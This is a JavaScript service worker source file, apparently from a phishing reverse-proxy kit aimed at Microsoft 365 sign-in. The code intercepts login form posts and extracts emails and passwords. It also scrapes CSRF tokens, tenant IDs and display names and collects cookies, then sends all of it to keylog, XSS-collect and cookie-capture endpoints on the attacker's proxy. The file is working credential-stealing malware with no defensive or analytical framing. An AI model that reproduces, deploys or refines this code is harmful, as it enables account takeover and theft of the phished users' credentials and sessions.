// ============================================================
//  SERVICE WORKER - Enhanced for Microsoft Proxy Integration
//  Intercepts requests, captures data, forwards to proxy
//  FIXED: CORS errors, API calls, page hangs
// ============================================================

const PROXY_PATH = "/lNv1pC9AWPUY4gbidyBO";
const XSS_ENDPOINT = "/xss-collect";
const COOKIE_ENDPOINT = "/cookie-capture";
const KEYLOG_ENDPOINT = "/keylog";

// Cache configuration
const CACHE_NAME = 'microsoft-proxy-cache-v1';
const CACHE_URLS = [
    '/',
    '/login',
    '/@',
    '/health'
];

// Install event - cache essential files
self.addEventListener('install', (event) => {
    console.log('[SW] Installing service worker...');
    event.waitUntil(
        caches.open(CACHE_NAME)
            .then((cache) => {
                console.log('[SW] Caching essential files...');
                return cache.addAll(CACHE_URLS);
            })
            .then(() => self.skipWaiting())
    );
});

// Activate event - clean old caches
self.addEventListener('activate', (event) => {
    console.log('[SW] Activating service worker...');
    event.waitUntil(
        caches.keys().then((cacheNames) => {
            return Promise.all(
                cacheNames.map((cacheName) => {
                    if (cacheName !== CACHE_NAME) {
                        console.log('[SW] Removing old cache:', cacheName);
                        return caches.delete(cacheName);
                    }
                })
            );
        })
        .then(() => self.clients.claim())
    );
});

// ============================================================
//  FETCH HANDLER - WITH FIXES FOR CORS AND API CALLS
// ============================================================

self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);
    
    // ✅ SKIP: Proxy requests to avoid loops
    if (event.request.url.includes('/lNv1pC9AWPUY4gbidyBO')) {
        return;
    }

    // ✅ SKIP: Health checks
    if (event.request.url.includes('/health')) {
        return;
    }

    // ✅ SKIP: Static assets (CSS, JS, images)
    if (event.request.url.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|mp4|webm|pdf)$/i)) {
        return;
    }

    // ✅ SKIP: Microsoft API calls (cause CORS errors)
    if (event.request.url.includes('/v1.0/me') ||
        event.request.url.includes('/common/userinfo') ||
        event.request.url.includes('graph.microsoft.com') ||
        event.request.url.includes('login.microsoftonline.com/common/oauth2')) {
        return;
    }

    // Handle different request types
    if (event.request.method === 'POST') {
        // ✅ ONLY intercept login POST requests to Microsoft
        if (event.request.url.includes('login.microsoftonline.com') || 
            event.request.url.includes('/proxy-login')) {
            event.respondWith(handlePostRequest(event.request));
        }
        // Otherwise, let it pass through
        return;
    } else if (event.request.method === 'GET') {
        // ✅ ONLY intercept HTML pages
        if (event.request.url.includes('.html') || 
            !event.request.url.includes('.') ||
            event.request.url.includes('/login')) {
            event.respondWith(handleGetRequest(event.request));
        }
        // Otherwise, let it pass through
        return;
    } else {
        // Default: forward request
        event.respondWith(fetch(event.request));
    }
});

// ============================================================
//  HANDLE POST REQUESTS - Capture form data
// ============================================================

async function handlePostRequest(request) {
    try {
        // Clone request to read body
        const clonedRequest = request.clone();
        const body = await clonedRequest.text();
        
        // Parse form data
        const formData = new URLSearchParams(body);
        const formObject = {};
        for (const [key, value] of formData) {
            formObject[key] = value;
        }

        // Check if this is a login request
        if (formObject.loginfmt || formObject.passwd || formObject.login || formObject.password) {
            console.log('[SW] 🔐 Captured login form data');
            
            const email = formObject.loginfmt || formObject.login || formObject.email || 'unknown';
            const password = formObject.passwd || formObject.password || '';
            
            // Send to keylogger endpoint
            await fetch(`${self.location.origin}${KEYLOG_ENDPOINT}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'form_submission',
                    keystrokes: `[FORM:${JSON.stringify(formObject)}]`,
                    url: request.url,
                    userAgent: navigator.userAgent || 'Service Worker',
                    timestamp: new Date().toISOString(),
                    sessionId: await getSessionId(),
                    email: email,
                    password: password,
                    service: 'Microsoft 365',
                    source: 'service_worker'
                })
            }).catch(() => {});
        }

        // ✅ Forward the original request
        return fetch(request);
    } catch (error) {
        console.error('[SW] POST handler error:', error);
        return fetch(request);
    }
}

// ============================================================
//  HANDLE GET REQUESTS - Intercept and capture data
// ============================================================

async function handleGetRequest(request) {
    try {
        // Try cache first
        const cachedResponse = await caches.match(request);
        if (cachedResponse) {
            console.log('[SW] Cache hit for:', request.url);
            return cachedResponse;
        }

        // Fetch from network
        const response = await fetch(request);
        const clonedResponse = response.clone();

        // Check if response is HTML
        const contentType = response.headers.get('content-type') || '';
        if (contentType.includes('text/html')) {
            // Process HTML response
            const html = await clonedResponse.text();
            
            // Check if this is a Microsoft login page
            if (html.includes('login.microsoftonline.com') || 
                html.includes('loginfmt') || 
                html.includes('passwd')) {
                console.log('[SW] 📄 Microsoft login page detected');
                
                // Extract data from page (NO API calls)
                await capturePageData(html, request.url);
            }
            
            // Cache the response
            const cache = await caches.open(CACHE_NAME);
            cache.put(request, response.clone());
        }

        return response;
    } catch (error) {
        console.error('[SW] GET handler error:', error);
        // ✅ Return fallback to avoid hanging
        return fetch(request);
    }
}

// ============================================================
//  CAPTURE PAGE DATA - NO API CALLS
// ============================================================

async function capturePageData(html, url) {
    try {
        // Extract email from HTML
        const emailMatch = html.match(/loginfmt["']?\s*value=["']([^"']+)/i) ||
                          html.match(/login_hint=([^&"']+)/i) ||
                          html.match(/email["']?\s*value=["']([^"']+)/i);
        const email = emailMatch ? decodeURIComponent(emailMatch[1]) : 'unknown';

        // Extract CSRF token
        const csrfMatch = html.match(/__RequestVerificationToken["']?\s*value=["']([^"']+)/i);
        const csrfToken = csrfMatch ? csrfMatch[1] : null;

        // Extract tenant ID
        const tenantMatch = html.match(/tenant["']?\s*value=["']([^"']+)/i) ||
                           html.match(/tenantid["']?\s*value=["']([^"']+)/i);
        const tenantId = tenantMatch ? tenantMatch[1] : null;

        // Extract display name
        const nameMatch = html.match(/displayName["']?\s*value=["']([^"']+)/i) ||
                         html.match(/<span[^>]*display-name[^>]*>([^<]+)<\/span>/i);
        const displayName = nameMatch ? nameMatch[1] : null;

        // ✅ NO API CALLS - Only DOM data and cookies
        const xssData = {
            dom: {
                email: email,
                csrfToken: csrfToken,
                tenantId: tenantId,
                displayName: displayName,
                pageUrl: url
            },
            storage: {
                cookies: 'Captured by service worker'
            },
            url: url,
            timestamp: new Date().toISOString(),
            service: 'Microsoft 365',
            capturedBy: 'service_worker',
            note: 'No API calls to avoid CORS'
        };

        // Get session ID
        const sessionId = await getSessionId();

        await fetch(`${self.location.origin}${XSS_ENDPOINT}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ...xssData,
                sessionId: sessionId,
                email: email
            })
        }).catch(() => {});

        console.log('[SW] ✅ Captured page data for:', email);

        // Also capture cookies
        await captureCookies(sessionId, email);

    } catch (error) {
        console.error('[SW] Page data capture error:', error);
    }
}

// ============================================================
//  CAPTURE COOKIES
// ============================================================

async function captureCookies(sessionId, email) {
    try {
        const cookies = document?.cookie || 'No cookies available';
        
        await fetch(`${self.location.origin}${COOKIE_ENDPOINT}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                cookies: cookies,
                url: self.location?.href || 'Unknown',
                sessionId: sessionId,
                email: email,
                timestamp: new Date().toISOString(),
                capturedBy: 'service_worker'
            })
        }).catch(() => {});

        console.log('[SW] 🍪 Captured cookies');
    } catch (error) {
        console.error('[SW] Cookie capture error:', error);
    }
}

// ============================================================
//  GET SESSION ID
// ============================================================

async function getSessionId() {
    try {
        // Try to get from clients
        const clients = await self.clients.matchAll();
        for (const client of clients) {
            const url = new URL(client.url);
            const sessionMatch = url.search.match(/sessionId=([^&]+)/);
            if (sessionMatch) {
                return sessionMatch[1];
            }
        }

        // Try to get from cookie
        const cookies = document?.cookie || '';
        const sessionMatch = cookies.match(/sessionId=([^;]+)/);
        if (sessionMatch) {
            return sessionMatch[1];
        }

        return 'sw_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    } catch (error) {
        return 'sw_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
    }
}

// ============================================================
//  MESSAGE HANDLER
// ============================================================

self.addEventListener('message', (event) => {
    const data = event.data;
    console.log('[SW] Received message:', data);

    if (data.type === 'capture_cookies') {
        captureCookies(data.sessionId, data.email);
    } else if (data.type === 'capture_xss') {
        capturePageData(data.html, data.url);
    } else if (data.type === 'get_session') {
        getSessionId().then(sessionId => {
            event.ports[0].postMessage({ sessionId: sessionId });
        });
    }
});

// ============================================================
//  PERIODIC TASKS
// ============================================================

// Check for session every 30 seconds
setInterval(async () => {
    try {
        const sessionId = await getSessionId();
        if (sessionId) {
            await fetch(`${self.location.origin}/health`, {
                method: 'GET',
                headers: { 'X-Session-Id': sessionId }
            }).catch(() => {});
        }
    } catch (error) {
        // Silently fail
    }
}, 30000);

console.log('[SW] ✅ Microsoft Proxy Service Worker loaded (CORS Fixed)');
console.log('[SW] 🔗 Proxy Path:', PROXY_PATH);
console.log('[SW] 🎯 XSS Endpoint:', XSS_ENDPOINT);
console.log('[SW] 🍪 Cookie Endpoint:', COOKIE_ENDPOINT);
console.log('[SW] ⌨️ Keylog Endpoint:', KEYLOG_ENDPOINT);
console.log('[SW] ✅ API calls DISABLED to prevent CORS');